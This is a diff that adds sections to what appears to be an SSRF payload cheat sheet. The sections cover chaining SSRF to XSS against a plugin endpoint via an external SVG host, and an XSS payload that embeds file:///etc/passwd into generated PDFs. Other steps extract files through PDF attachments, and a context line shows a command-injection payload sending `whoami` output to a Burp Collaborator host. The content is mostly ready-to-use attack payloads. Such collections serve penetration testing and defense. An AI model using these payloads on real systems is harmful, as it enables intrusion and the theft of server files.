@@ -291,6 +291,35 @@ url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`
 
 Checking the time of the responses from the server it might be possible to know if a resource exists or not (maybe it takes more time accessing an existing resource than accessing one that doesn't exist)
 
+## SSRF to XSS
+```html
+http://brutelogic.com.br/poc.svg      //simple alert
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=      //simple ssrf
+
+https://website.mil/plugins/servlet/oauth/users/icon-uri?consumerUri=http://brutelogic.com.br/poc.svg
+
+```
+
+## SSRF from XSS
+
+**Using an iframe**
+
+The content of the file will be integrated inside the PDF as an image or text
+```javascript
+<img src="echopwn" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+
+```
+
+**Using an attachment**
+
+Example of a PDF attachment using HTML
+
+1. use `<link rel=attachment href="URL">` as Bio text
+2. use `'Download Data'` feature to get PDF
+3. use `pdfdetach -saveall filename.pdf` to extract embedded resource
+4. cat `attachment.bin`
+
+
 # Tools
 
 * https://github.com/swisskyrepo/SSRFmap
